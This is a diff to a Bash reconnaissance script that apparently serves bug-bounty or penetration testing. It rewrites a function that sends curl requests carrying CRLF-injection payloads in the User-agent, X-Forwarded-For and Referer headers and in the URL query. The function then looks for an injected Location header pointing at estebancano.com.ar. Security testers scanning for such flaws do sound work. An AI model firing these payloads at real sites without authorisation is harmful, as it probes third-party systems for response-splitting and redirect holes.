@@ -284,7 +284,7 @@ subdomains(){
 		echo -e "\e[32m\tDoing Curl to check headers for redirect...\033[0m" | tee -a salida.txt
 		checkheadersforredirect lista$nombre$now.txt checkheader_redirect$1.txt | tee -a salida.txt
 		echo -e "\e[32m\tDoing Curl to check headers for redirect...\033[0m" | tee -a salida.txt
-		checkheadersforinjection lista$nombre$now.txt checkheader_inject$1.txt | tee -a salida.txt
+		#checkheadersforinjection lista$nombre$now.txt checkheader_inject$1.txt | tee -a salida.txt
 		echo -e "\e[32m\tHeaders Check done... \033[0m" | tee -a salida.txt
 		
 	done
@@ -372,14 +372,29 @@ checkheadersforinjection(){
 	cat $1 | while read url; do
 		regex='(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
 		if [[ $url =~ $regex ]]; then 
-			response=$(curl -iH "X-Forwarded-For: estebancano.com.ar/abc.php" $url)
-			if [[ $response == *"X-Forwarded-For: estebancano.com.ar/abc.php"* ]]; then
-				echo "\r\n*** URL: $url - Header: X-Forwarded-For: estebancano.com.ar/abc.php" >> $2
+			response=$(curl -LiH "User-agent:abc%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a" $url)
+			if [[ $response == *"Location:estebancano.com.ar/abc.php"* ]] || [[ $response == *"<!-- CH3CK -->"* ]]; then
+				echo "\r\n*** Header User-agent injected: Cookie:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection in $url" >> $2
+				((i++))
+			fi
+			response=$(curl -LiH "X-forwarded-for:%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a" $url)
+			if [[ $response == *"Location:estebancano.com.ar/abc.php"* ]] || [[ $response == *"<!-- CH3CK -->"* ]]; then
+				echo "\r\n*** Header X-forwarded-for injected: Cookie:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection in $url" >> $2
+				((i++))
+			fi
+			response=$(curl -LiH "Referer:%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a" $url)
+			if [[ $response == *"Location:estebancano.com.ar/abc.php"* ]] || [[ $response == *"<!-- CH3CK -->"* ]]; then
+				echo "\r\n*** Header Referer injected: Cookie:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection in $url" >> $2
+				((i++))
+			fi
+			response=$(curl -LiH "User-agent:" $url%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a)
+			if [[ $response == *"Location:estebancano.com.ar/abc.php"* ]] || [[ $response == *"<!-- CH3CK -->"* ]]; then
+				echo "\r\n*** Url query injected: Cookie:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection in $url" >> $2
 				((i++))
 			fi
 		fi
 	done
-	echo -e "\e[32m\tFound $i headers with potential redirect... \033[0m"
+	echo -e "\e[32m\tFound $i headers injected... \033[0m"
 }
 
 # Find all resolved*.txt in recon directory, merges them and check for CNAME records
@@ -413,7 +428,7 @@ checkheaders(){
 	echo -e "\e[32m\tDoing Curl to check headers for redirect...\033[0m" | tee -a ~/tools/checkheaders/$1$now.txt
 	checkheadersforredirect ~/tools/checkheaders/urls$now.txt checkheader_redirect$1.txt | tee -a ~/tools/checkheaders/$1$now.txt
 	echo -e "\e[32m\tDoing Curl to check headers for redirect...\033[0m" | tee -a ~/tools/checkheaders/$1$now.txt
-	checkheadersforinjection ~/tools/checkheaders/urls$now.txt checkheader_inject$1.txt | tee -a ~/tools/checkheaders/$1$now.txt
+	#checkheadersforinjection ~/tools/checkheaders/urls$now.txt checkheader_inject$1.txt | tee -a ~/tools/checkheaders/$1$now.txt
 	echo -e "\e[32m\tHeaders Check done... \033[0m" | tee -a ~/tools/checkheaders/$1$now.txt
 	rm ~/tools/checkheaders/urls$now.txt
 }
